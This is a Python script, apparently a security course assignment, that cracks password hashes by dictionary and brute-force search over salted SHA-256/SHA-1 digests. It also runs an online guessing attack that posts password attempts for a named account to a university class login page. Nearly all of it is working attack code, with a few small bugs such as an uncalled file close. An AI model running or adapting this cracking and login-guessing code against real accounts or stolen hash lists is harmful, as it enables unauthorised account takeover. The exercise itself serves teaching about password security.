import hashlib
from itertools import product
import time
import requests

"""
Launch a dictionary attack by calling method and attempting all the words in the wordEn.txt file
Once the word has been varified to be the correct password, it will print the password along with account info
"""
def launch_dictionary_attack():
    #start timer
    start_time = time.time()
    #create account and word list
    account_list = read_list("dictionary_accounts.txt")
    words_list = read_dictionary()
    
    #loop through accounts
    for account in account_list:
        user_name = account[0]
        user_salt = account[1]
        user_hash = account[2]
        
        #loop through all posible words 
        for dictionary_word in words_list:
            if dictionary_attack(user_name, dictionary_word, user_salt, user_hash) is True:
                print("--- %s seconds ---" % (time.time() - start_time))
                print(user_name, dictionary_word, user_salt, user_hash)

"""
Launch a random attack by calling method and attempting all posible combinations of characters
Once the word has been varified to be the correct password, it will print the password along with account info
"""
def launch_random_attack():
    #start timer
    start_time = time.time()
    
    account_list = read_list("random_accounts.txt")
    print(account_list)
    
    #create hashtable to lookup 
    lookup = {}
    for account in account_list:
        lookup.update({account[1]: account[0] })
    
    #random attack characters
    characters = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
                  "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                  "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                  "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
                  "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
                  "U", "V", "W", "X", "Y", "Z"]
    #get all possible combinations of characters based on size 1-10
    for i in range(10):
        for comb in product(characters, repeat=i):
            word = ''.join(comb)
            
            #check if hashed word is the same as the users hash
            hashed_word = random_attack(word)
            if hashed_word in lookup.keys():
                print("--- %s seconds ---" % (time.time() - start_time))
                print(lookup.get(hashed_word), word, hashed_word )

"""
Launch a online attack by calling method and attempting all posible combinations of 2 lowercase characters
Post request is send out with a dealy of 1.0 seconds to delay flooding server
"""
def launch_online_attack():
    characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                  "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                  "u", "v", "w", "x", "y", "z"]
    url = 'https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php'
    user_name = 'jonathan42_-uLQ'
    
    #try all combinations of 2 letters and send post request
    for i in range(2):
        for comb in product(characters, repeat=i):
            word = ''.join(comb)
            user_pass = word
            
            online_attack(url, user_name, user_pass)
            #sleep to not flood server
            time.sleep(1.0)
    

def dictionary_attack(name, word, salt, hashword):
    #add salt to word
    testcase = word + salt

    #pass word through sha256
    pass_bytes = testcase.encode('utf-8')
    pass_hash256 = hashlib.sha256(pass_bytes)
    digest256 = pass_hash256.hexdigest()
    
    #sha256 word thorugh sha1
    pass_bytes = digest256.encode('utf-8')
    pass_hash1 = hashlib.sha1(pass_bytes)
    digest1 = pass_hash1.hexdigest()

    #check if double hashed word is equal to user hash
    if digest1 == hashword:
        return True
    
def random_attack(word):
    pass_bytes = word.encode('utf-8')
    pass_hash256 = hashlib.sha256(pass_bytes)
    digest256 = pass_hash256.hexdigest()
    
    #sha256 word thorugh sha1
    pass_bytes = digest256.encode('utf-8')
    pass_hash1 = hashlib.sha1(pass_bytes)
    digest1 = pass_hash1.hexdigest()

    #check if double hashed word is equal to user hash
    return digest1

def online_attack(url, username, password):
    data = {'un': username, 'pw': password}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(url, params = data, headers = headers)
    print(r.text)

def read_list(filename):
    a_file = open(filename, "r")
    account_list = []
    for line in a_file:
        line = line.strip()
        stripped_line = line.replace(" ", "")
        line_list = stripped_line.split(",")
        account_list.append(line_list)
    a_file.close
    return account_list

def read_dictionary():
    with open ('wordsEn.txt','r') as f :
        words = [word.rstrip() for word in f]
    return words

launch_dictionary_attack()
launch_random_attack()